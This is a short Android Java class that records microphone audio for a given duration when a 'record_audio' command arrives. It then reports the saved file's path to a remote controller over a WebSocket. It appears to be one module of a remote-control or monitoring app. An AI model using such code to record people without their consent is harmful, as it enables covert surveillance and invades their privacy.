package com.abm.fatakeshto;

import android.media.MediaRecorder;
import org.json.JSONObject;
import java.io.File;

public class MicrophoneRecorder {
    private DeviceService service;
    private MediaRecorder recorder;
    private File audioFile;

    public MicrophoneRecorder(DeviceService service) {
        this.service = service;
    }

    public void recordAudio(int durationSeconds) {
        try {
            audioFile = new File(service.getCacheDir(), "audio.3gp");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            new android.os.Handler().postDelayed(this::stopRecording, durationSeconds * 1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void stopRecording() {
        if (recorder != null) {
            recorder.stop();
            recorder.release();
            recorder = null;
            try {
                JSONObject response = new JSONObject();
                response.put("type", "response");
                response.put("command", "record_audio");
                response.put("data", "audio_file_path:" + audioFile.getAbsolutePath());
                service.getWebSocketManager().sendMessage(response.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}